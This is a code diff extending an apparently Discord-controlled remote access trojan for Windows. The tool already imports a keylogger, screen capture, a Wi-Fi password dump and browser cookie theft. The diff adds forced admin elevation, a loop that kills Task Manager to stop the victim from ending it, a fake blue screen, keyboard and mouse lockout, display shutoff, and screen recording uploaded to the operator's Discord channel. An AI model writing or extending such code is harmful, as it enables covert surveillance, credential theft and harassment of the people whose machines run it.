@@ -7,13 +7,14 @@ import socket
 import subprocess
 import atexit
 import psutil
-from discord.ext import commands
+from discord.ext import commands, tasks
 from pynput import keyboard
 from io import BytesIO
 import numpy as np
 import mss
 import os
 import threading
+from multiprocessing import Process
 from discord import ButtonStyle
 from discord.ui import View, Button
 import time
@@ -22,6 +23,7 @@ import winreg
 import win32com.client
 import sys
 import shutil
+import browser_cookie3
 from discord.ui import View, Select, Button
 from discord import SelectOption, Interaction, File
 import io
@@ -36,6 +38,7 @@ import pyttsx3
 import tempfile
 import random
 import re
+import string
 from discord.ext import commands
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from PIL import Image, ImageDraw, ImageTk
@@ -50,6 +53,27 @@ import win32api
 import win32con
 import certifi
 from win10toast import ToastNotifier
+import winsound
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def run_as_admin():
+    if sys.version_info[0] == 3:
+        params = " ".join([f'"{arg}"' for arg in sys.argv])
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, params, None, 1)
+        sys.exit()
+    else:
+        print("Admin check only supported on Python 3+")
+        sys.exit()
+
+if not is_admin():
+    print("Admin rights required. Relaunching as admin...")
+    run_as_admin()
 
 os.environ['SSL_CERT_FILE'] = certifi.where()
 
@@ -57,6 +81,7 @@ FFMPEG_PATH = imageio_ffmpeg.get_ffmpeg_exe()
 # ---------------------------------------------------------------------------
 VOICE_CHANNEL_ID = 00000000000000000000 # Replace with your voice channel ID
 READY_ID = 00000000000000000000 # Replace with your channel ID
+TASK_MGR_CHANNEL_ID = 00000000000000000000  # Replace with your Discord channel ID
 BOT_TOKEN = 'your token'  # Replace with your bot token
 # ---------------------------------------------------------------------------
 
@@ -117,7 +142,11 @@ clist2 = """
 - `!rotate [degrees]`: Rotate the screen by specified degrees
 - `!wallpaper [url/image]`: Change desktop wallpaper
 - `!wifi_passwords`: Get saved Wi-Fi passwords
-- `!lockpc`: Lock the Windows session immediately"""
+- `!lockpc`: Lock the Windows session immediately
+- `!dpoff`: Disable the display output (turn off the screen)
+- `!bsod`: Trigger a fake Blue Screen of Death (BSOD)
+- `!blockinput [duration]`: Block all user input (keyboard/mouse) for a duration
+- `!screenrecord [duration]`: Record the screen for a specified duration"""
 
 streaming_active = False  # Flag to control screen streaming loop
 
@@ -136,16 +165,45 @@ listener.start()
 
 @bot.event
 async def on_ready():
-    custom_process_name()
     print(f'Bot is ready. Logged in as {bot.user}')
     channel = bot.get_channel(READY_ID)
     if channel:
         await channel.send("Connected")
         await channel.send(clist)
         await channel.send(clist2)
+        await channel.send("# WARNING")
+        await channel.send("## The program is easily overloaded if too many commands are sent before the previous command is finished.")
+        await channel.send("## Please be patient and wait for the previous command to finish before sending a new one.")
+        check_task_manager.start()
 
-def custom_process_name():
-    setproctitle.setproctitle("MyCustomProcessName")
+taskmgr_was_open = False  # Track previous state
+
+@tasks.loop(seconds=1)
+async def check_task_manager():
+    global taskmgr_was_open
+    channel = bot.get_channel(TASK_MGR_CHANNEL_ID)
+    if not channel:
+        print("Channel not found")
+        return
+
+    tm_running = False
+    # Check if Taskmgr.exe is running and terminate it
+    for proc in psutil.process_iter(['name']):
+        if proc.info['name'] and proc.info['name'].lower() == "taskmgr.exe":
+            tm_running = True
+            try:
+                proc.terminate()  # Attempt graceful termination
+                await channel.send("⚠️ Task Manager was opened and has been terminated automatically!")
+            except Exception as e:
+                await channel.send(f"❌ Failed to terminate Task Manager: {e}")
+            break
+
+    if tm_running and not taskmgr_was_open:
+        # Sent termination message above, no need to send twice
+        taskmgr_was_open = True
+    elif not tm_running and taskmgr_was_open:
+        await channel.send("✅ Task Manager has been closed.")
+        taskmgr_was_open = False
 
 @bot.command()
 async def specialkeylist(ctx):
@@ -1344,4 +1402,193 @@ async def lockpc(ctx):
     except Exception as e:
         await ctx.send(f"❌ Failed to lock PC: {e}")
 
+HWND_BROADCAST = 0xFFFF
+WM_SYSCOMMAND = 0x0112
+SC_MONITORPOWER = 0xF170
+
+def turn_off_monitor():
+    # -1 = on, 1 = low power, 2 = off
+    ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
+
+def turn_on_monitor():
+    # To turn the monitor back on, send SC_MONITORPOWER with -1 or send a mouse event
+    ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
+
+@bot.command()
+async def dpoff(ctx, duration: int = 10):
+    """
+    Turns off the display for `duration` seconds, then turns it back on.
+    Usage: !display_off 10
+    """
+    if duration <= 0:
+        await ctx.send("❌ Duration must be a positive number of seconds.")
+        return
+
+    await ctx.send(f"🖥️ Turning off the display for {duration} seconds...")
+    turn_off_monitor()
+
+    await asyncio.sleep(duration)
+
+    turn_on_monitor()
+    await ctx.send("✅ Display turned back on.")
+
+def show_bsod(duration_seconds: float = 6.0, message: str | None = None):
+    """
+    Show a fullscreen, topmost "BSOD" window for duration_seconds, then close.
+    If Esc is pressed it will close immediately.
+    """
+
+    # Only run on Windows
+    if platform.system().lower() != "windows":
+        print("[bsod] Not running: host is not Windows.")
+        return
+
+    def _display():
+        root = tk.Tk()
+        root.title("Blue Screen")
+        # fullscreen and always on top
+        root.attributes("-fullscreen", True)
+        root.configure(background="#010080")  # deep blue - tweak if necessary
+        root.attributes("-topmost", True)
+
+        # Escape closes immediately
+        def close(evt=None):
+            try:
+                root.destroy()
+            except Exception:
+                pass
+
+        root.bind("<Escape>", close)
+
+        # Prepare BSOD-style text
+        # Use a large monospace font
+        fs = 28
+        # Big headline
+        headline = tk.Label(root,
+                            text=":(\nYour PC ran into a problem and needs to restart.",
+                            fg="white", bg="#010080",
+                            font=("Consolas", 34, "bold"),
+                            justify="left")
+        headline.pack(anchor="nw", padx=40, pady=(40, 10))
+
+        # Optional custom message
+        if message:
+            msg_text = message
+        else:
+            msg_text = (
+                "A problem has been detected and Windows has been shut down to prevent damage\n"
+                "to your computer.\n\nIf this is the first time you've seen this Stop error screen,\n"
+                "restart your computer. If this screen appears again, follow these steps:\n\n"
+                "  • Check for viruses on your computer.\n  • Remove any newly installed hard drives or hard drive controllers.\n  • Check your hard drive to make sure it is properly configured and terminated.\n\nTechnical information:\n*** STOP: 0x0000007E (0xFFFFFFFFC0000005, 0xFFFFF80001023456, 0xFFFFF88001234567, 0xFFFFF88001234567)\n"
+            )
+
+        body = tk.Label(root, text=msg_text, fg="white", bg="#010080",
+                        font=("Consolas", fs), justify="left")
+        body.pack(anchor="nw", padx=40)
+
+        footer = tk.Label(root,
+                          text="\nIf you want to get back to the desktop press ESC or wait for auto-reset.",
+                          fg="white", bg="#010080",
+                          font=("Consolas", 20),
+                          justify="left")
+        footer.pack(anchor="sw", side="bottom", padx=40, pady=40)
+
+        # Optionally make a system beep (non-blocking)
+        try:
+            winsound.MessageBeep(winsound.MB_ICONHAND)
+        except Exception:
+            pass
+
+        # Close after duration_seconds
+        def auto_close():
+            time.sleep(duration_seconds)
+            try:
+                root.destroy()
+            except Exception:
+                pass
+
+        threading.Thread(target=auto_close, daemon=True).start()
+
+        # Start the Tk mainloop (blocking only inside this thread)
+        try:
+            root.mainloop()
+        except Exception:
+            pass
+
+    # Run GUI in a separate thread to avoid blocking caller
+    t = threading.Thread(target=_display, daemon=True)
+    t.start()
+
+
+# Discord command wrapper
+@bot.command()
+async def bsod(ctx, duration: float = 6.0, *, custom: str = None):
+    """
+    Trigger a simulated BSOD on the host machine for `duration` seconds.
+    Usage: !bsod 10 Optional custom message text
+    - Press ESC to dismiss immediately.
+    - Duration is in seconds (float allowed).
+    """
+    # Security: restrict who can call? optionally check ctx.author.id or roles here.
+    # For safety, you could uncomment and adjust the check below:
+    # if ctx.author.id != YOUR_USER_ID:
+    #     return await ctx.send("You are not allowed to run this command.")
+
+    # Confirm host is Windows
+    if platform.system().lower() != "windows":
+        await ctx.send("❌ This command only runs on Windows hosts.")
+        return
+
+    # Trigger the overlay locally
+    show_bsod(duration_seconds=max(1.0, float(duration)), message=custom)
+    await ctx.send(f"✅ Simulated BSOD displayed for {duration} seconds (Esc to close).")
+
+@bot.command()
+async def screenrecord(ctx, seconds: int):
+    await ctx.send(f"🎥 Recording screen for {seconds} seconds...")
+
+    output_file = "screen_record.mp4"
+    fps = 30  # Lower FPS = smaller file size
+    monitor_index = 1  # Change if you want another monitor
+
+    with mss.mss() as sct:
+        monitor = sct.monitors[monitor_index]
+        width = monitor["width"]
+        height = monitor["height"]
+
+        fourcc = cv2.VideoWriter_fourcc(*"mp4v")  # MP4 codec
+        out = cv2.VideoWriter(output_file, fourcc, fps, (width, height))
+
+        start_time = time.time()
+        while (time.time() - start_time) < seconds:
+            img = np.array(sct.grab(monitor))
+            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+            out.write(frame)
+            time.sleep(1 / fps)
+
+        out.release()
+
+    await ctx.send("✅ Recording complete. Uploading...")
+    try:
+        await ctx.send(file=discord.File(output_file))
+    except:
+        await ctx.send("⚠️ File too large for Discord, saved locally.")
+    finally:
+        if os.path.exists(output_file):
+            os.remove(output_file)
+
+@bot.command()
+async def blockinput(ctx, duration: int):
+    """
+    Blocks mouse and keyboard input for <duration> seconds.
+    """
+    try:
+        ctypes.windll.user32.BlockInput(True)  # Lock input
+        await ctx.send(f"✅ Input blocked for {duration} seconds.")
+        await asyncio.sleep(duration)
+    finally:
+        ctypes.windll.user32.BlockInput(False)  # Unlock input
+        await ctx.send("🛑 Input unlocked.")
+
 bot.run(BOT_TOKEN)
+
